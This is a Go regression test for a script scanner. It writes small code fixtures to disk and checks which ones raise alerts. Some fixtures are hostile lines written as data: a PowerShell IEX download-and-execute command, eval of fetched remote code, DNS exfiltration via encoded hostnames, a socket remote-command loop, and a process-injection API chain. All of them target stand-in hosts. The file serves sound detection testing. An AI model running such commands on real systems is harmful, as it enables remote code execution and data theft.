package main

// Regression controls for redacted school-computer reports dated 2026-11-10.
// The original source files were not supplied, and these cases are
// illustrative *inert* text fixtures, not purported reproductions.
// No script is executed, imported, downloaded, or automatically quarantined.

import (
    "os"
    "path/filepath"
    "strings"
    "testing"
)

func TestStage14SchoolReportContextControls(t *testing.T) {
    cases := []struct{name, filename, content string; alert bool}{
        {"python-injection-identifiers-only","memory.py",
           "VirtualAllocEx = 'documented API'\nWriteProcessMemory = 'documented API'\nCreateRemoteThread = 'documented API'",false},
        {"python-active-injection-calls","memory.py",
           "proc = kernel.OpenProcess(1,0,4)\naddr=kernel.VirtualAllocEx(proc,0,4096,0,0)\nkernel.WriteProcessMemory(proc,addr,data,4096,0)\nkernel.CreateRemoteThread(proc,0,0,addr,0,0,0)",true},
        {"python-remote-unrelated-sections","network.py",
           "import socket,subprocess\ns=socket.socket()\ns.connect(addr)\ns.recv(1024)\n"+strings.Repeat("data = process_records()\n",200)+"\nresult=subprocess.run(['echo','hi'])\ns.send(result.stdout)",false},
        {"python-remote-command-loop","network.py",
           "import socket,subprocess\ns=socket.socket()\ns.connect(addr)\ncmd=s.recv(1024)\nresult=subprocess.run(cmd)\ns.send(result.stdout)",true},
        {"python-dns-unrelated-hex","resolver.py",
           "import socket\nfor p in packets:\n print(p.hex())\nfor name in hostnames:\n socket.gethostbyname(name)",false},
        {"python-dns-encoded-label","resolver.py",
           "import socket\nfor packet in packets:\n label=packet.hex()\n socket.gethostbyname(label + '.example.invalid')",true},
        {"js-scattered-ps-keywords","bundle.js",
           "function one(){downloadfile('local.txt')}\n"+strings.Repeat("var unrelated = 7;\n",300)+"function two(){invoke_expression(42)}",false},
        {"js-eval-remote-fetch","bundle.js",
           "eval(await fetch('https://example.invalid/demo').then(x=>x.text()))",true},
        {"html-separated-export-primitives","export.html",
           "<html><script>const v=atob('QQ==')</script><script>let a=new Blob([v]);URL.createObjectURL(a)</script><script>button.click()</script></html>",false},
        {"html-script-decoded-auto-download","export.html",
           "<html><script>var data=atob('QQ==');var b=new Blob([data]);var a=document.createElement('a');a.href=URL.createObjectURL(b);a.click()</script></html>",true},
        {"html-text-only-reference","docs.html",
           "<html><p>atob( new Blob( createObjectURL( .click( are just code documentation</p></html>",false},
        {"cpp-active-remote-thread-chain","process.cpp",
           "void f(){OpenProcess(0,0,1);VirtualAllocEx(h,0,16,0,0);WriteProcessMemory(h,p,b,16,0);CreateRemoteThread(h,0,0,0,0,0,0);}",true},
        {"cpp-commented-chain","process.cpp",
           "/* OpenProcess( VirtualAllocEx( WriteProcessMemory( CreateRemoteThread( */\nvoid benign(){}",false},
        {"ps-dynamic-dns-signal-still-detected","dns.ps1","nslookup $chunk.example.invalid",true},
        {"ps-download-execute-still-detected","launcher.ps1",
           "IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/inert')",true},
        {"ps-quoted-example-benign","launcher.ps1",
           "Write-Host \"IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/inert')\"",false},
    }
    for _, tc := range cases {
        t.Run(tc.name,func(t *testing.T){
            p:=filepath.Join(t.TempDir(),tc.filename)
            if err:=os.WriteFile(p,[]byte(tc.content),0600);err!=nil{t.Fatal(err)}
            st,err:=os.Stat(p);if err!=nil{t.Fatal(err)}
            f:=inspectFile(p,st)
            got:=f!=nil
            if got!=tc.alert {
                if f!=nil {t.Fatalf("want alert=%t got %t score=%d reasons=%v",tc.alert,got,f.Score,f.Reasons)}
                t.Fatalf("want alert=%t got %t",tc.alert,got)
            }
        })
    }
}
